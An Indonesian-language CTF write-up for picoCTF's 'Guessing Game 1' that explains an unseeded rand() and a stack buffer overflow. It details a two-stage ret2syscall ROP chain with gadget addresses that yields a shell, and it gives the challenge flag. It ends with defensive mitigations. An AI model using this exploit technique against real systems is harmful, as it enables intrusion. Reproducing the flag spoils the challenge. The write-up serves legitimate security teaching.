# Writeup: Guessing Game 1 (Challenge ID: 90)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Binary Exploitation / Ret2Syscall Static ROP & Unseeded PRNG Prediction
- **Difficulty:** Medium (diff=2)
- **Event:** picoCTF 2020 Mini-Competition
- **Points:** 200
- **Author:** madStacks
- **Flag:** `academy{r0p_y0u_l1k3_4_hurr1c4n3_3ea9d94813b570b2}`

---

## Problem Statement & Scope
Tantangan `Guessing Game 1` menyajikan layanan biner ELF 64-bit Linux yang dikompilasi secara statis (`guessing-game-1-vuln`). Pengguna diminta menebak angka rahasia antara 1 hingga 100 yang digenerasikan menggunakan fungsi `rand() % 100 + 1`. Ketika tebakan benar, fungsi `win()` dipanggil untuk meminta nama pengguna melalui `fgets(winner, 360, stdin)`.

Pemeriksaan keamanan biner (`checksec`) menunjukkan konfigurasi proteksi:
- **Arch:** x86-64 (64-bit)
- **RELRO:** Partial RELRO
- **Stack Canary:** No canary found (tidak ada proteksi stack smashing)
- **NX:** NX enabled (Stack non-executable)
- **PIE:** No PIE (Base statis 0x400000)

Ruang lingkup audit keamanan perangkat lunak ini mencakup:
1. Analisis implementasi PRNG glibc tanpa inisialisasi seed (CWE-330).
2. Analisis batas masukan buffer stack pada fungsi `fgets` (CWE-120).
3. Pemanfaatan biner statis non-PIE untuk mengidentifikasi gadget ROP dan area memori writable `.bss` (0x4c9360).
4. Perancangan rantai eksploitasi dua tahap Return-to-Syscall (Ret2Syscall) untuk memanggil `sys_execve` (`/bin/sh`) sesuai standar **NIST SP 800-115 Section 4.2**.

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Pembangkit Bilangan Acak Tidak Ter-seed (Unseeded PRNG / CWE-330):**
   - Fungsi `rand()` dipanggil tanpa pemanggilan `srand()`. Standar ISO C dan implementasi glibc menentukan bahwa jika `rand()` dipanggil sebelum `srand()`, generator berperilaku seolah-olah dipanggil dengan `srand(1)`.
   - Oleh karena itu, deret acak bersifat deterministik sepenuhnya:
     $$\text{ans} = (\text{rand}_{\text{seed}=1}(1) \pmod{100}) + 1 = 83 + 1 = 84$$
   - Nilai jawaban pertama selalu 84 pada setiap koneksi baru.
2. **Buffer Overflow Tanpa Proteksi Stack (CWE-120):**
   - Fungsi `win()` mengalokasikan buffer `winner` sebesar 0x70 (112 byte) pada stack:
     ```c
     char winner[112];
     fgets(winner, 360, stdin);
     ```
   - Pembacaan 360 byte ke dalam buffer 112 byte memungkinkan penulisan melampaui buffer:
     - Offset 0..111: Buffer lokal
     - Offset 112..119: Saved RBP (8 byte)
     - Offset 120..127: Saved RIP (8 byte)
   - Biner tidak dikompilasi dengan `-fstack-protector`, sehingga kontrol eksekusi RIP diperoleh tepat pada offset 120.
3. **Eksploitasi Biner Statis Dua Tahap (Two-Stage Ret2Syscall):**
   - Karena biner dikompilasi statis, tidak ada fungsi `system()` yang diekspor secara dinamis. Namun, kode internal libc berada pada alamat tetap tanpa PIE.
   - Area segmen `.bss` pada `0x4c9360` memiliki izin baca-tulis (`rw-`).
   - Rencana ROP:
     - Tahap 1: Memanggil `read(0, BSS, 0x180)` dan mengatur return address ke `BSS`.
     - Tahap 2: Menulis string `/bin/sh\x00` ke awal `BSS` dan mengeksekusi `execve(BSS, NULL, NULL)` melalui gadget `syscall` dengan `rax = 59`.

---

## Rekonstruksi Eksploitasi Step-by-Step
1. **Penebakan Deterministik:**
   - Menghubungkan soket TCP ke target kontainer.
   - Mengirim masukan `84\n` saat prompt `What number would you like to guess?` muncul.
   - Server merespon dengan `Congrats! You win! Your prize is this print statement!` dan mencetak prompt `Name?`.
2. **Gadget ROP yang Diidentifikasi (objdump-verified):**
   - `pop rdi; ret` : `0x40206f`
   - `pop rsi; pop r15; ret` : `0x40206d`
   - `pop rax; pop rdx; pop rbx; ret` : `0x486bba`
   - `pop rdx; xor eax, eax; pop rbp; pop r12; ret` : `0x422b69`
   - `syscall; ret` : `0x41b406`
   - `__libc_read` : `0x450e80`
   - Alamat target `.bss` : `0x4c9460` (offset +0x100 dari basis `.bss`).
3. **Penyusunan ROP Tahap 1 (Read ke BSS & Pivot):**
   - Payload dikirim pada prompt `Name?`:
     ```
     [120 bytes padding 'A']
     pop rdi; ret -> 0 (stdin)
     pop rsi; pop r15; ret -> 0x4c9460 (BSS), dummy 0xdead
     pop rax; pop rdx; pop rbx; ret -> 0, 0x180, dummy 0xbeef
     __libc_read -> 0x450e80
     return address -> 0x4c9460 (BSS)
     ```
4. **Penyusunan Payload Tahap 2 (Syscall Execve):**
   - Dikirim segera setelah tahap 1 dipicu:
     ```
     "/bin/sh\x00" (8 bytes pada 0x4c9460)
     pop rdi; ret -> 0x4c9460
     pop rsi; pop r15; ret -> 0, dummy 0xdead
     pop rax; pop rdx; pop rbx; ret -> 59 (sys_execve), 0, dummy 0xbeef
     syscall; ret -> 0x41b406
     ```
   - Panjang total diselaraskan menjadi 0x180 byte.
5. **Eksekusi Perintah Shell & Verifikasi:**
   - Setelah syscall dieksekusi, kontrol shell aktif diperoleh.
   - Mengirim perintah `cat flag.txt` menghasilkan token: `academy{r0p_y0u_l1k3_4_hurr1c4n3_3ea9d94813b570b2}`.
6. **Validasi REST API CyLab:**
   - Skrip `scripts/solve_90_guessing_game_1.py` memvalidasi offline reproduktif dan verifikasi live `POST /api/submissions/` menghasilkan HTTP 201 `correct: true`.

---

## Flag & Verifikasi
- **Flag Resmi:** `academy{r0p_y0u_l1k3_4_hurr1c4n3_3ea9d94813b570b2}`
- **Flag Komunitas:** `CTF{r0p_y0u_l1k3_4_hurr1c4n3_3ea9d94813b570b2}`
- **Bukti Validasi:** Live REST API CyLab mengembalikan status HTTP 201 `{"user": 1072359, "challenge": 90, "correct": true, "historical": false}`.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif
1. **Inisialisasi Entropi Kriptografis yang Benar:**
   - Jangan pernah mengandalkan fungsi `rand()` standar tanpa seed untuk logika keamanan atau autentikasi. Gunakan penyedia entropi sistem seperti `getrandom(2)` atau `/dev/urandom` pada Linux.
2. **Penerapan Batas Buffer yang Ketat:**
   - Batasi masukan `fgets` agar tidak melebihi kapasitas buffer tujuan: `fgets(winner, sizeof(winner), stdin)`.
3. **Pemberdayaan Mitigasi Kompilasi Modern:**
   - Wajib mengaktifkan Stack Canary (`-fstack-protector-strong` atau `-fstack-protector-all`) dan Position Independent Executable (`-fPIE -pie`) sehingga pemetaan fungsi dan segmen `.bss` tidak berada pada alamat statis.
